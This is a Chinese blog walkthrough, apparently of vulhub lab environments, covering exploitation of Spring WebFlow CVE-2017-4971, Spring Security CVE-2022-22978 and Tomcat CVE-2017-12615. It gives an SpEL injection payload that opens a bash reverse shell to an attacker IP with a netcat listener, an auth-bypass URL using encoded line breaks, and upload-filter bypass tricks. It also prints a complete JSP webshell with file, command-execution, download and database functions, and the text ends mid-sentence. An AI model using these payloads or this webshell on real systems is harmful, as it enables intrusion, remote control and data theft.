          <a href="#Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="headerlink" title="Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）"></a>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h2>
      <p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271554889.png" alt="image-20240627155407752"></p>
<p>点击上面的”Login”，从左边任选一个用户进行登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271555671.png" alt="image-20240627155534561"></p>
<p>随意输入一个编号查询酒店</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271556761.png" alt="image-20240627155646655"></p>
<p>比如这里输入2</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271558440.png" alt="image-20240627155827337"></p>
<p>选择第一个酒店，点击“View Hotel”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271558763.png" alt="image-20240627155859648"></p>
<p>点击“Book Hotel”，填写相关信息后点击“Proceed”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271600653.png" alt="image-20240627160051543"></p>
<p>点击“Confirm”确认，并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271601362.png" alt="image-20240627160146313"></p>

        <h5 id="漏洞验证"   >
          <a href="#漏洞验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5>
      <p>抓到一个POST数据包，添加内容</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</span><br></pre></td></tr></table></div></figure>

<p>返回响应头中包含<code>vulnerable: True</code>, 验证漏洞</p>

        <h5 id="反弹shell"   >
          <a href="#反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5>
      <p>重新抓包添加内容</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/your-ip/10086+0&gt;%261&quot;)).start()=vulhub</span><br></pre></td></tr></table></div></figure>

<p>（这里应该是对空格和某些字符进行了一定的处理，所以用了url编码处理了一些）</p>
<p>开启一个端口10086</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 10086</span><br></pre></td></tr></table></div></figure>

<p>然后发包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271651353.png" alt="image-20240627165105291"></p>
<p>成功拿到shell</p>

        <h2 id="Spring-Security身份验证绕过漏洞-CVE-2022-22978"   >
          <a href="#Spring-Security身份验证绕过漏洞-CVE-2022-22978" class="heading-link"><i class="fas fa-link"></i></a><a href="#Spring-Security身份验证绕过漏洞-CVE-2022-22978" class="headerlink" title="Spring Security身份验证绕过漏洞(CVE-2022-22978)"></a>Spring Security身份验证绕过漏洞(CVE-2022-22978)</h2>
      <p>在Spring Security 5.5.7之前、5.6.4 之前以及不受支持的旧版本中，使用正则表达式中包含”. “的RegexRequestMatcher的应用程序易被换行符\r（%0a）、回车符\n（%0d）绕过，可利用此漏洞在未授权的情况下绕过身份认证，导致配置的权限验证失效。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407090933638.png" alt="image-20240709093335510"></p>
<p>（payload直接就给了）</p>
<p>点击<code>/admin/</code>链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407090935420.png" alt="image-20240709093530380"></p>
<p>在url中拼接管理员目录/admin以及换行符%0a或回车符%d后向目标url发起攻击</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin/%0a</span><br><span class="line">/admin/%0d</span><br><span class="line">/admin/%0a%0d</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407090945972.png" alt="image-20240709094552912"></p>

        <h1 id="Tomcat"   >
          <a href="#Tomcat" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1>
      
        <h2 id="CVE-2017-12615"   >
          <a href="#CVE-2017-12615" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2>
      <p>当 Tomcat 运行在Windows主机上，且启用了<code>PUT</code>请求方法（例如，将 readonly 初始化参数由默认值设置为 ftalse），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件。之后，JSP文件中的代码将能被服务器执行。 </p>
<p>通过以上两个漏洞可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406140947337.png" alt="image-20240614094720183"></p>
<p>抓包发送到Repeater，<code>GET</code>修改为<code>PUT</code>，添加文件3.jsp，发包后显示201即为上传成功</p>
<p>文件内容为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;</span><br><span class="line">&lt;%!String Pwd = &quot;pass&quot;;</span><br><span class="line"></span><br><span class="line">    String EC(String s, String c) throws Exception &#123;</span><br><span class="line">        return s;</span><br><span class="line">    &#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;</span><br><span class="line"></span><br><span class="line">    Connection GC(String s) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Class.forName(x[0].trim()).newInstance();</span><br><span class="line">        Connection c = DriverManager.getConnection(x[1].trim());</span><br><span class="line">        if (x.length &gt; 2) &#123;</span><br><span class="line">            c.setCatalog(x[2].trim());</span><br><span class="line">        &#125;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void AA(StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File r[] = File.listRoots();</span><br><span class="line">        for (int i = 0; i &lt; r.length; i++) &#123;</span><br><span class="line">            sb.append(r[i].toString().substring(0, 2));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void BB(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File oF = new File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = &quot;&quot;;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        for (int i = 0; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = new java.util.Date(l[i].lastModified());</span><br><span class="line">            sT = fm.format(dt);</span><br><span class="line">            sQ = l[i].canRead() ? &quot;R&quot; : &quot;&quot;;</span><br><span class="line">            sQ += l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;</span><br><span class="line">            if (l[i].isDirectory()) &#123;</span><br><span class="line">                sb.append(l[i].getName() + &quot;/\t&quot; + sT + &quot;\t&quot; + l[i].length()</span><br><span class="line">                        + &quot;\t&quot; + sQ + &quot;\n&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                sF += l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;</span><br><span class="line">                        + sQ + &quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sF);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void EE(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        if (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();</span><br><span class="line">            for (int k = 0; k &lt; x.length; k++) &#123;</span><br><span class="line">                if (!x[k].delete()) &#123;</span><br><span class="line">                    EE(x[k].getPath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void FF(String s, HttpServletResponse r) throws Exception &#123;</span><br><span class="line">        int n;</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));</span><br><span class="line">        os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void GG(String s, String d) throws Exception &#123;</span><br><span class="line">        String h = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">        int n;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = new FileOutputStream(f);</span><br><span class="line">        for (int i = 0; i &lt; d.length(); i += 2) &#123;</span><br><span class="line">            os</span><br><span class="line">                    .write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d</span><br><span class="line">                            .charAt(i + 1))));</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void HH(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        if (sf.isDirectory()) &#123;</span><br><span class="line">            if (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            File z[] = sf.listFiles();</span><br><span class="line">            for (int j = 0; j &lt; z.length; j++) &#123;</span><br><span class="line">                HH(s + &quot;/&quot; + z[j].getName(), d + &quot;/&quot; + z[j].getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            FileInputStream is = new FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = new FileOutputStream(df);</span><br><span class="line">            int n;</span><br><span class="line">            byte[] b = new byte[512];</span><br><span class="line">            while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">                os.write(b, 0, n);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void II(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        sf.renameTo(df);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void JJ(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void KK(String s, String t) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void LL(String s, String d) throws Exception &#123;</span><br><span class="line">        URL u = new URL(s);</span><br><span class="line">        int n;</span><br><span class="line">        FileOutputStream os = new FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream is = h.getInputStream();</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">        h.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void MM(InputStream is, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">        while ((l = br.readLine()) != null) &#123;</span><br><span class="line">            sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void NN(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = c.getMetaData().getCatalogs();</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(1) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void OO(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] t = &#123; &quot;TABLE&quot; &#125;;</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(null, null, &quot;%&quot;, t);</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void PP(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1007);</span><br><span class="line">        ResultSet r = m.executeQuery(&quot;select * from &quot; + x[3]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();</span><br><span class="line">        for (int i = 1; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)</span><br><span class="line">                    + &quot;)\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        int i;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1008);</span><br><span class="line">        try &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            int n = d.getColumnCount();</span><br><span class="line">            for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(&quot;\r\n&quot;);</span><br><span class="line">            while (r.next()) &#123;</span><br><span class="line">                for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                    sb.append(EC(r.getString(i), cs) + &quot;\t|\t&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                sb.append(&quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            r.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(&quot;Result\t|\t\r\n&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);</span><br><span class="line">            &#125; catch (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;%&gt;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">&lt;%</span><br><span class="line">    String cs = request.getParameter(&quot;z0&quot;)==null?&quot;gbk&quot;: request.getParameter(&quot;z0&quot;) + &quot;&quot;;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(&quot;text/html;charset=&quot; + cs);</span><br><span class="line">    String Z = EC(request.getParameter(Pwd) + &quot;&quot;, cs);</span><br><span class="line">    String z1 = EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;, cs);</span><br><span class="line">    String z2 = EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;, cs);</span><br><span class="line">    StringBuffer sb = new StringBuffer(&quot;&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        sb.append(&quot;-&gt;&quot; + &quot;|&quot;);</span><br><span class="line">        if (Z.equals(&quot;A&quot;)) &#123;</span><br><span class="line">            String s = new File(application.getRealPath(request</span><br><span class="line">                    .getRequestURI())).getParent();</span><br><span class="line">            sb.append(s + &quot;\t&quot;);</span><br><span class="line">            if (!s.substring(0, 1).equals(&quot;/&quot;)) &#123;</span><br><span class="line">                AA(sb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (Z.equals(&quot;B&quot;)) &#123;</span><br><span class="line">            BB(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;C&quot;)) &#123;</span><br><span class="line">            String l = &quot;&quot;;</span><br><span class="line">            BufferedReader br = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(new FileInputStream(new File(</span><br><span class="line">                            z1))));</span><br><span class="line">            while ((l = br.readLine()) != null) &#123;</span><br><span class="line">                sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; else if (Z.equals(&quot;D&quot;)) &#123;</span><br><span class="line">            BufferedWriter bw = new BufferedWriter(</span><br><span class="line">                    new OutputStreamWriter(new FileOutputStream(</span><br><span class="line">                            new File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;E&quot;)) &#123;</span><br><span class="line">            EE(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;F&quot;)) &#123;</span><br><span class="line">            FF(z1, response);</span><br><span class="line">        &#125; else if (Z.equals(&quot;G&quot;)) &#123;</span><br><span class="line">            GG(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;H&quot;)) &#123;</span><br><span class="line">            HH(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;I&quot;)) &#123;</span><br><span class="line">            II(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;J&quot;)) &#123;</span><br><span class="line">            JJ(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;K&quot;)) &#123;</span><br><span class="line">            KK(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;L&quot;)) &#123;</span><br><span class="line">            LL(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;M&quot;)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(c);</span><br><span class="line">            MM(p.getInputStream(), sb);</span><br><span class="line">            MM(p.getErrorStream(), sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;N&quot;)) &#123;</span><br><span class="line">            NN(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;O&quot;)) &#123;</span><br><span class="line">            OO(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;P&quot;)) &#123;</span><br><span class="line">            PP(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;Q&quot;)) &#123;</span><br><span class="line">            QQ(cs, z1, z2, sb);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(&quot;|&quot; + &quot;&lt;-&quot;);</span><br><span class="line">    out.print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141104305.png" alt="image-20240614110457259"></p>

        <h6 id="关键点：绕过文件上传限制"   >
          <a href="#关键点：绕过文件上传限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键点：绕过文件上传限制" class="headerlink" title="关键点：绕过文件上传限制"></a>关键点：绕过文件上传限制</h6>
      
        <h6 id="后缀名后加-可绕过上传，文件名后缀加-DATA，上传文件后缀名加上-20，上传文件名后缀加上"   >
          <a href="#后缀名后加-可绕过上传，文件名后缀加-DATA，上传文件后缀名加上-20，上传文件名后缀加上" class="heading-link"><i class="fas fa-link"></i></a><a href="#后缀名后加-可绕过上传，文件名后缀加-DATA，上传文件后缀名加上-20，上传文件名后缀加上" class="headerlink" title="后缀名后加/可绕过上传，文件名后缀加::$DATA，上传文件后缀名加上%20，上传文件名后缀加上."></a>后缀名后加/可绕过上传，文件名后缀加::$DATA，上传文件后缀名加上%20，上传文件名后缀加上.</h6>
      <p>再用蚁剑连接，密码为<code>pass</code>，并且这里类型要选择<code>CUSTOM</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141106878.png" alt="image-20240614110623828"></p>
<p>添加数据拿到shell</p>
<p>但是不知道为啥同样的文件内容冰蝎就是连接失败，若是要用冰蝎则上传的文件内容应为</p>
